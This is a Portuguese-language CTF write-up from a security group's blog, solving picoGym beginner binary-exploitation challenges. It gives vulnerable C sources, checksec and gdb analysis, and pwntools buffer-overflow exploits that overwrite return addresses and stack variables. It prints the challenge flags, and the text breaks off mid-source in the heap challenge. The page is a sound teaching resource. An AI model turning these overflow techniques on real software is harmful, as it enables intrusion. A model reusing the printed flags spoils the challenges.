<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Resolvendo os desafios iniciais de pwn do picoCTF | Blog do GRIS</title>
<meta name=keywords content="pwn,ctf"><meta name=description content="Esse é um writeup dos 15 desafios iniciais de pwning do picoGym. Você pode encontrar esses desafios em [picoGym](https://play.picoctf.org/practice). Há também um desafio extra no final do post de um outro CTF :)"><meta name=author content="dkvhr"><link rel=canonical href=http://localhost:1313/blog/2024-08-02-picogym-pwn-easy/><meta name=google-site-verification content="G-YWN8S4BKK0"><link crossorigin=anonymous href=/assets/css/stylesheet.45e028aa8ce0961349adf411b013ee39406be2c0bc80d4ea3fc04555f7f4611a.css integrity="sha256-ReAoqozglhNJrfQRsBPuOUBr4sC8gNTqP8BFVff0YRo=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/images/gris-logo-2020%27s_black.png><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/images/gris-logo-2020-black-16x16.png><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/images/gris-logo-2020-black-32x32.png><link rel=apple-touch-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/blog/2024-08-02-picogym-pwn-easy/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css integrity=sha384-MlJdn/WNKDGXveldHDdyRP1R4CTHr3FeuDNfhsLPYrq2t0UBkUdK2jyTnXPEK1NQ crossorigin=anonymous><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js integrity=sha384-VQ8d8WVFw0yHhCk5E8I86oOhv48xLpnDZx5T9GogA/Y84DcCKWXDmSDfn13bzFZY crossorigin=anonymous></script><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js integrity=sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR crossorigin=anonymous onload=renderMathInElement(document.body)></script>>
<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><meta property="og:url" content="http://localhost:1313/blog/2024-08-02-picogym-pwn-easy/"><meta property="og:site_name" content="Blog do GRIS"><meta property="og:title" content="Resolvendo os desafios iniciais de pwn do picoCTF"><meta property="og:description" content="Esse é um writeup dos 15 desafios iniciais de pwning do picoGym. Você pode encontrar esses desafios em [picoGym](https://play.picoctf.org/practice). Há também um desafio extra no final do post de um outro CTF :)"><meta property="og:locale" content="pt"><meta property="og:type" content="article"><meta property="article:section" content="blog"><meta property="article:published_time" content="2024-08-02T00:00:00+00:00"><meta property="article:modified_time" content="2024-08-02T00:00:00-03:00"><meta property="article:tag" content="Pwn"><meta property="article:tag" content="Ctf"><meta property="og:image" content="http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="Resolvendo os desafios iniciais de pwn do picoCTF"><meta name=twitter:description content="Esse é um writeup dos 15 desafios iniciais de pwning do picoGym. Você pode encontrar esses desafios em [picoGym](https://play.picoctf.org/practice). Há também um desafio extra no final do post de um outro CTF :)"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Blogs","item":"http://localhost:1313/blog/"},{"@type":"ListItem","position":2,"name":"Resolvendo os desafios iniciais de pwn do picoCTF","item":"http://localhost:1313/blog/2024-08-02-picogym-pwn-easy/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Resolvendo os desafios iniciais de pwn do picoCTF","name":"Resolvendo os desafios iniciais de pwn do picoCTF","description":"Esse é um writeup dos 15 desafios iniciais de pwning do picoGym. Você pode encontrar esses desafios em [picoGym](https://play.picoctf.org/practice). Há também um desafio extra no final do post de um outro CTF :)","keywords":["pwn","ctf"],"articleBody":"Esse é um writeup dos 15 desafios iniciais de pwning do picoGym. Você pode encontrar esses desafios em picoGym. Há também um desafio extra no final do post de um outro CTF :) Vamos começar ^^\nbuffer overflow 0 Nos é dado este arquivo C:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 #include #include #include #include #define FLAGSIZE_MAX 64 char flag[FLAGSIZE_MAX]; void sigsegv_handler(int sig) { printf(\"%s\\n\", flag); fflush(stdout); exit(1); } void vuln(char *input){ char buf2[16]; strcpy(buf2, input); } int main(int argc, char **argv){ FILE *f = fopen(\"flag.txt\",\"r\"); if (f == NULL) { printf(\"%s %s\", \"Please create 'flag.txt' in this directory with your\", \"own debugging flag.\\n\"); exit(0); } fgets(flag,FLAGSIZE_MAX,f); signal(SIGSEGV, sigsegv_handler); // Set up signal handler gid_t gid = getegid(); setresgid(gid, gid, gid); printf(\"Input: \"); fflush(stdout); char buf1[100]; gets(buf1); vuln(buf1); printf(\"The program will exit now\\n\"); return 0; } Ao realizar um checksec, obtemos o seguinte resultado:\n1 2 3 4 5 Arch: i386-32-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled Antes de começar, criei uma flag de debug em um arquivo chamado flag.txt. Dessa forma, podemos fazer o programa rodar localmente.\nSe olharmos o código, o arquivo flag.txt será lido e gravado em char flag[FLAGSIZE]. A única maneira de exibir o conteúdo da flag é acionando a função de sinal. Isso significa que, se causarmos um erro de segmentação, por exemplo, o conteúdo da flag será exibido.\nFelizmente, o programa usa a função gets. Ela escreverá na variável char buf1[100] qualquer coisa que quisermos, sem considerar o tamanho. Se olharmos para a função vuln, veremos que ela copia do argumento de entrada (que será o buf1) para um buffer de tamanho 16.\nPortanto, se sobrescrevermos o endereço de retorno da função vuln com algum valor inválido, isso definitivamente causará um erro de segmentação.\nVocê pode simplesmente colocar muitos caracteres A para garantir que o endereço de retorno seja sobrescrito com eles. Eu coloquei AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA. Ao analisar o programa no gdb, podemos ver isso:\nO programa irá travar, pois temos ‘AAAA’ como endereço de retorno, e isso não é válido. Executando o programa fora do gdb, ele passará pela função sigsegv_handler, que nos dará a flag:\nflag: picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}\nbuffer overflow 1 Aqui está o arquivo C fornecido:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 #include #include #include #include #include #include \"asm.h\" #define BUFSIZE 32 #define FLAGSIZE 64 void win() { char buf[FLAGSIZE]; FILE *f = fopen(\"flag.txt\",\"r\"); if (f == NULL) { printf(\"%s %s\", \"Please create 'flag.txt' in this directory with your\", \"own debugging flag.\\n\"); exit(0); } fgets(buf,FLAGSIZE,f); printf(buf); } void vuln(){ char buf[BUFSIZE]; gets(buf); printf(\"Okay, time to return... Fingers Crossed... Jumping to 0x%x\\n\", get_return_address()); } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); gid_t gid = getegid(); setresgid(gid, gid, gid); puts(\"Please enter your string: \"); vuln(); return 0; } Ao realizar um checksec, obtemos o seguinte:\n1 2 3 4 5 6 7 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX unknown - GNU_STACK missing PIE: No PIE (0x8048000) Stack: Executable RWX: Has RWX segments Como o binário não possui um stack canary, podemos facilmente sobrescrever o endereço de retorno usando a função gets em vuln().\nAo sobrescrever o endereço de retorno da função vuln, precisamos preencher todo o buffer char buf[BUFSIZE], alguns outros valores intermediários e, em seguida, o endereço de retorno.\nExecutei o programa dentro do gdb e usei o comando pattern create -n 4. Também coloquei um ponto de interrupção na instrução ret da função vuln e executei. Quando solicitado por uma entrada, forneci o padrão gerado pelo gdb. Terminamos nesta situação:\nHá algumas coisas importantes aqui. Observe o endereço impresso na parte superior da tela: Okay, time to return... Fingers Crossed... Jumping to 0x6161616c. O endereço de retorno impresso aqui é 0x6161616c.\nPodemos confirmar isso olhando para a pilha. Temos: 0xffffd14c│+0x0000: \"laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxa[...]\" no topo.\nOs primeiros 4 caracteres são laaa, que em hexadecimal é igual a 0x6161616c. Este é o endereço de retorno sendo usado pela função. Isso significa que podemos simplesmente mudar o laaa em nossa entrada para o endereço de retorno que desejamos (no caso, a função win, para que possamos obter a flag).\nComo não temos PIE, podemos simplesmente usar diretamente o endereço da função win, que é 0x080491f6 (você pode obtê-lo usando o comando disas win no gdb ou colocando o programa em um descompilador como Ghidra).\nJuntando tudo isso, aqui está minha solução usando pwntools:\n1 2 3 4 5 6 7 8 context(arch = 'i386', os = 'linux') r = remote(saturn.picoctf.net, 64507) payload = b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaa' payload += int.to_bytes(0x080491f6, 4, 'little') r.sendline(payload) r.recvline() r.recvline() r.interactive() buffer overflow 2 Aqui está o código-fonte:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 #include #include #include #include #include #define BUFSIZE 100 #define FLAGSIZE 64 void win(unsigned int arg1, unsigned int arg2) { char buf[FLAGSIZE]; FILE *f = fopen(\"flag.txt\",\"r\"); if (f == NULL) { printf(\"%s %s\", \"Please create 'flag.txt' in this directory with your\", \"own debugging flag.\\n\"); exit(0); } fgets(buf,FLAGSIZE,f); if (arg1 != 0xCAFEF00D) return; if (arg2 != 0xF00DF00D) return; printf(buf); } void vuln(){ char buf[BUFSIZE]; gets(buf); puts(buf); } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); gid_t gid = getegid(); setresgid(gid, gid, gid); puts(\"Please enter your string: \"); vuln(); return 0; } E aqui está o resultado do checksec:\n1 2 3 4 5 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) Também temos uma função gets neste desafio. Comecei executando o gdb e usando o comando pattern create -n 4. Coloquei um ponto de interrupção na instrução ret da função vuln e forneci a entrada com o padrão gerado. Esta é uma captura de tela da minha instância do gdb:\nUsei pattern offset daabeaa para encontrar em qual posição estou sobrescrevendo o endereço de retorno.\nIsso significa que precisamos escrever 112 bytes de alguma coisa para chegar até o endereço de retorno. Eu sobrescrevi ele com o endereço da função win (Não temos PIE, então podemos pegar o endereço exatamente como ele é e fica tudo certo).\nDepois de sobrescrever o endereço de retorno, também precisamos lidar com os argumentos da função. Se apenas escrevermos eles após o endereço de retorno, quando fizermos a comparação:\n1 2 3 4 if (arg1 != 0xCAFEF00D) return; if (arg2 != 0xF00DF00D) return; Isso aqui vai acontecer:\nPerceba como DWORD PTR [ebp+0x8] contém 0xf00df00d ao invés de 0xcafef00d. Podemos resolver isso de forma simples ao adicionar 4 bytes extras logo antes do primeiro argumento para que tudo fique alinhado.\nAté o momento nós temos: 112 bytes + return address + 4 bytes de padding + primeiro argumento da função + segundo argumento da função\nResolvi desse jeito aqui:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 from pwn import * context(arch = \"i386\", os=\"linux\", endian=\"little\") p = remote(\"saturn.picoctf.net\", 58084) payload = b'A' * 112 payload += p32(0x08049296) payload += p32(0) payload += p32(0xcafef00d) payload += p32(0xf00df00d) p.sendline(payload) p.interactive() x sixty what Esse challenge é similar aos anteriores. A principal diferença é que agora nós temos um arquivo de 64 bits. Aqui está o source code:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 #include #include #include #include #include #define BUFFSIZE 64 #define FLAGSIZE 64 void flag() { char buf[FLAGSIZE]; FILE *f = fopen(\"flag.txt\",\"r\"); if (f == NULL) { printf(\"%s %s\", \"Please create 'flag.txt' in this directory with your\", \"own debugging flag.\\n\"); exit(0); } fgets(buf,FLAGSIZE,f); printf(buf); } void vuln(){ char buf[BUFFSIZE]; gets(buf); } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); gid_t gid = getegid(); setresgid(gid, gid, gid); puts(\"Welcome to 64-bit. Give me a string that gets you the flag: \"); vuln(); return 0; } E aqui está o resultado do checksec:\n1 2 3 4 5 Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) A função vuln usa gets para escrever no buffer de tamanho 64. Como o binário não usa PIE, podemos simplesmente sobrescrever o endereço de retorno com o endereço da função flag conforme vemos no binário.\nNosso payload precisa de 64 bytes para preencher o buffer + 8 bytes para escrever no rbp + o endereço de retorno que queremos sobrescrever.\nAqui está o meu solve usando o pwntools:\n1 2 3 4 5 6 7 8 9 10 11 12 from pwn import * context(arch = \"amd64\", os=\"linux\", endian=\"little\") p = remote(\"saturn.picoctf.net\", 63716) payload = b'A' * 72 payload += p64(0x000000000040123b) p.sendline(payload) p.recvline() p.interactive() Que nos dá a flag: picoCTF{b1663r_15_b3773r_d95e02b6}\nLocal Target Aqui está o source code:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 #include #include int main(){ FILE *fptr; char c; char input[16]; int num = 64; printf(\"Enter a string: \"); fflush(stdout); gets(input); printf(\"\\n\"); printf(\"num is %d\\n\", num); fflush(stdout); if( num == 65 ){ printf(\"You win!\\n\"); fflush(stdout); // Open file fptr = fopen(\"flag.txt\", \"r\"); if (fptr == NULL) { printf(\"Cannot open file.\\n\"); fflush(stdout); exit(0); } // Read contents from file c = fgetc(fptr); while (c != EOF) { printf (\"%c\", c); c = fgetc(fptr); } fflush(stdout); printf(\"\\n\"); fflush(stdout); fclose(fptr); exit(0); } printf(\"Bye!\\n\"); fflush(stdout); } E aqui está o checksec:\n1 2 3 4 5 Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Inspecionando o código fonte, precisamos acionar esta condição: if( num == 65 ). Mas num é declarado como 64 logo após nossa variável input. Felizmente, há uma função gets que escreve em input. Podemos usá-la para causar um buffer overflow e sobrescrever num, que é uma variável local e, portanto, armazenada na pilha.\nPrecisamos fornecer uma entrada que sobrescreva nosso buffer de caracteres, sobreponha o espaço entre o buffer e a variável num, e então sobrescreva a própria variável num. Como queremos que num seja 65, podemos simplesmente escrever o caractere A nele, já que o valor ASCII de A é 65.\nAqui está o meu solve:\n1 2 3 4 5 6 nc saturn.picoctf.net 56776 Enter a string: AAAAAAAAAAAAAAAABBBBBBBBA num is 65 You win! picoCTF{l0c4l5_1n_5c0p3_ee58441a} flag: picoCTF{l0c4l5_1n_5c0p3_ee58441a}\nclutter overflow Aqui o source code:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 #include #include #define SIZE 0x100 #define GOAL 0xdeadbeef const char* HEADER = \" ______________________________________________________________________\\n\" \"|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|\\n\" \"| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |\\n\" \"|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|\\n\" \"| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ / \\\\^ ^ |\\n\" \"|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ / \\\\ ^ _ ^ / | | \\\\^ ^|\\n\" \"| ^/_\\\\^ ^ ^ /_________\\\\^ ^ ^ /_\\\\ | // | /_\\\\ ^| | ____ ____ | | ^ |\\n\" \"|^ =|= ^ =================^ ^=|=^| |^=|=^ | | {____}{____} | |^ ^|\\n\" \"| ^ ^ ^ ^ | ========= |^ ^ ^ ^ ^\\\\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |\\n\" \"|^ ^ ^ ^ ^| / ( \\\\ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/ %%%%%%%%%%%%%% \\\\|^ ^|\\n\" \".-----. ^ || ) ||^ ^.-------.-------.^| %%%%%%%%%%%%%%%% | ^ |\\n\" \"| |^ ^|| o ) ( o || ^ | | | | /||||||||||||||||\\\\ |^ ^|\\n\" \"| ___ | ^ || | ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |\\n\" \"|'.____'_^||/!\\\\@@@@@/!\\\\|| _'______________.'|== =====\\n\" \"|\\\\|______|===============|________________|/|\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\n\" \"\\\" ||\\\"\\\"\\\"\\\"||\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"||\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"||\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\" \\n\" \"\\\"\\\"''\\\"\\\"\\\"\\\"''\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"''\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"''\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\n\" \"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\n\" \"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"\"; int main(void) { long code = 0; char clutter[SIZE]; setbuf(stdout, NULL); setbuf(stdin, NULL); setbuf(stderr, NULL); puts(HEADER); puts(\"My room is so cluttered...\"); puts(\"What do you see?\"); gets(clutter); if (code == GOAL) { printf(\"code == 0x%llx: how did that happen??\\n\", GOAL); puts(\"take a flag for your troubles\"); system(\"cat flag.txt\"); } else { printf(\"code == 0x%llx\\n\", code); printf(\"code != 0x%llx :(\\n\", GOAL); } return 0; } E aqui o checksec:\n1 2 3 4 5 Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Como podemos ver no código fonte, clutter é um buffer de caracteres com tamanho 0x100. Precisamos sobrescrever a variável long code com o valor 0xdeadbeef para imprimir a flag.\nComo é uma variável local, long code provavelmente estará na pilha. Vamos inserir um breakpoint logo antes da função gets e dar uma olhada na pilha nesse momento:\n0x7fffffffdff0 é o endereço no registro rbp. Se olharmos para o valor imediatamente antes disso, há uma série de 0’s, que provavelmente são a variável code. Eles estão no endereço 0x7fffffffdfe8. Fazendo uma simples matemática com o endereço do topo da pilha e o endereço da variável, obtemos: 0x7fffffffdfe8 - 0x7fffffffdee0 = 264. Portanto, precisamos fornecer uma entrada de 264 caracteres + 0xdeadbeef para sobrescrever precisamente a variável code com o GOAL.\nAqui o meu solve:\n1 2 3 4 5 6 7 8 9 from pwn import * p = remote(\"mars.picoctf.net\", 31890) payload = b'A' * 264 payload += p64(0xdeadbeef) p.sendline(payload) p.interactive() RPS Esse é um chall simples em que você só precisa ler o source code e ver o que está errado. Aqui está ele:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 #include #include #include #include #include #include #include #include #define WAIT 60 static const char* flag = \"[REDACTED]\"; char* hands[3] = {\"rock\", \"paper\", \"scissors\"}; char* loses[3] = {\"paper\", \"scissors\", \"rock\"}; int wins = 0; int tgetinput(char *input, unsigned int l) { fd_set input_set; struct timeval timeout; int ready_for_reading = 0; int read_bytes = 0; if( l \u003c= 0 ) { printf(\"'l' for tgetinput must be greater than 0\\n\"); return -2; } /* Empty the FD Set */ FD_ZERO(\u0026input_set ); /* Listen to the input descriptor */ FD_SET(STDIN_FILENO, \u0026input_set); /* Waiting for some seconds */ timeout.tv_sec = WAIT; // WAIT seconds timeout.tv_usec = 0; // 0 milliseconds /* Listening for input stream for any activity */ ready_for_reading = select(1, \u0026input_set, NULL, NULL, \u0026timeout); /* Here, first parameter is number of FDs in the set, * second is our FD set for reading, * third is the FD set in which any write activity needs to updated, * which is not required in this case. * Fourth is timeout */ if (ready_for_reading == -1) { /* Some error has occured in input */ printf(\"Unable to read your input\\n\"); return -1; } if (ready_for_reading) { read_bytes = read(0, input, l-1); if(input[read_bytes-1]=='\\n'){ --read_bytes; input[read_bytes]='\\0'; } if(read_bytes==0){ printf(\"No data given.\\n\"); return -4; } else { return 0; } } else { printf(\"Timed out waiting for user input. Press Ctrl-C to disconnect\\n\"); return -3; } return 0; } bool play () { char player_turn[100]; srand(time(0)); int r; printf(\"Please make your selection (rock/paper/scissors):\\n\"); r = tgetinput(player_turn, 100); // Timeout on user input if(r == -3) { printf(\"Goodbye!\\n\"); exit(0); } int computer_turn = rand() % 3; printf(\"You played: %s\\n\", player_turn); printf(\"The computer played: %s\\n\", hands[computer_turn]); if (strstr(player_turn, loses[computer_turn])) { puts(\"You win! Play again?\"); return true; } else { puts(\"Seems like you didn't win this time. Play again?\"); return false; } } int main () { char input[3] = {'\\0'}; int command; int r; puts(\"Welcome challenger to the game of Rock, Paper, Scissors\"); puts(\"For anyone that beats me 5 times in a row, I will offer up a flag I found\"); puts(\"Are you ready?\"); while (true) { puts(\"Type '1' to play a game\"); puts(\"Type '2' to exit the program\"); r = tgetinput(input, 3); // Timeout on user input if(r == -3) { printf(\"Goodbye!\\n\"); exit(0); } if ((command = strtol(input, NULL, 10)) == 0) { puts(\"Please put in a valid number\"); } else if (command == 1) { printf(\"\\n\\n\"); if (play()) { wins++; } else { wins = 0; } if (wins \u003e= 5) { puts(\"Congrats, here's the flag!\"); puts(flag); } } else if (command == 2) { return 0; } else { puts(\"Please type either 1 or 2\"); } } return 0; } Precisamos vencer 5 vezes consecutivas para obter a flag. Para verificar se sua jogada vence contra a jogada do computador, o programa faz uma strstr(player_turn, loses[computer_turn]). Ele verifica se sua entrada de string contém a string da jogada que ganha.\nSe fornecermos uma entrada de rockpaperscissors, essa verificação sempre será verdadeira, já que temos todas as possibilidades no array loses. Resolvi isso manualmente:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 nc saturn.picoctf.net 50553 Welcome challenger to the game of Rock, Paper, Scissors For anyone that beats me 5 times in a row, I will offer up a flag I found Are you ready? Type '1' to play a game Type '2' to exit the program 1 Please make your selection (rock/paper/scissors): rockpaperscissors You played: rockpaperscissors The computer played: rock You win! Play again? Type '1' to play a game Type '2' to exit the program 1 Please make your selection (rock/paper/scissors): rockpaperscissors You played: rockpaperscissors The computer played: scissors You win! Play again? Type '1' to play a game Type '2' to exit the program 1 Please make your selection (rock/paper/scissors): rockpaperscissors You played: rockpaperscissors The computer played: paper You win! Play again? Type '1' to play a game Type '2' to exit the program 1 Please make your selection (rock/paper/scissors): rockpaperscissors You played: rockpaperscissors The computer played: scissors You win! Play again? Type '1' to play a game Type '2' to exit the program 1 Please make your selection (rock/paper/scissors): rockpaperscissors You played: rockpaperscissors The computer played: rock You win! Play again? Congrats, here's the flag! picoCTF{50M3_3X7R3M3_1UCK_58F0F41B} Type '1' to play a game Type '2' to exit the program 2 Ncat: Broken pipe. Podemos ver a flag após 5 vitórias:\nflag: picoCTF{50M3_3X7R3M3_1UCK_58F0F41B}\nheap 0 Aqui o source code:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 #include #include #include #define FLAGSIZE_MAX 64 // amount of memory allocated for input_data #define INPUT_DATA_SIZE 5 // amount of memory allocated for safe_var #define SAFE_VAR_SIZE 5 int num_allocs; char *safe_var; char *input_data; void check_win() { if (strcmp(safe_var, \"bico\") != 0) { printf(\"\\nYOU WIN\\n\"); // Print flag char buf[FLAGSIZE_MAX]; FILE *fd = fopen(\"flag.txt\", \"r\"); fgets(buf, FLAGSIZE_MAX, fd); printf(\"%s\\n\", buf); fflush(stdout); exit(0); } else { printf(\"Looks like everything is still secure!\\n\"); printf(\"\\nNo flage for you :(\\n\"); fflush(stdout); } } void print_menu() { printf(\"\\n1. Print Heap:\\t\\t(print the current state of the heap)\" \"\\n2. Write to buffer:\\t(write to your own personal block of data \" \"on the heap)\" \"\\n3. Print safe_var:\\t(I'll even let you look at my variable on \" \"the heap, \" \"I'm confident it can't be modified)\" \"\\n4. Print Flag:\\t\\t(Try to print the flag, good luck)\" \"\\n5. Exit\\n\\nEnter your choice: \"); fflush(stdout); } void init() { printf(\"\\nWelcome to heap0!\\n\"); printf( \"I put my data on the heap so it should be safe from any tampering.\\n\"); printf(\"Since my data isn't on the stack I'll even let you write whatever \" \"info you want to the heap, I already took care of using malloc for \" \"you.\\n\\n\"); fflush(stdout); input_data = malloc(INPUT_DATA_SIZE); strncpy(input_data, \"pico\", INPUT_DATA_SIZE); safe_var = malloc(SAFE_VAR_SIZE); strncpy(safe_var, \"bico\", SAFE_VAR_SIZE); } void write_buffer() { printf(\"Data for buffer: \"); fflush(stdout); scanf(\"%s\", input_data); } void print_heap() { printf(\"Heap State:\\n\"); printf(\"+-------------+----------------+\\n\"); printf(\"[*] Address -\u003e Heap Data \\n\"); printf(\"+-------------+----------------+\\n\"); printf(\"[*] %p -\u003e %s\\n\", input_data, input_data); printf(\"+-------------+----------------+\\n\"); printf(\"[*] %p -\u003e %s\\n\", safe_var, safe_var); printf(\"+-------------+----------------+\\n\"); fflush(stdout); } int main(void) { // Setup init(); print_heap(); int choice; while (1) { print_menu(); int rval = scanf(\"%d\", \u0026choice); if (rval == EOF){ exit(0); } if (rval != 1) { //printf(\"Invalid input. 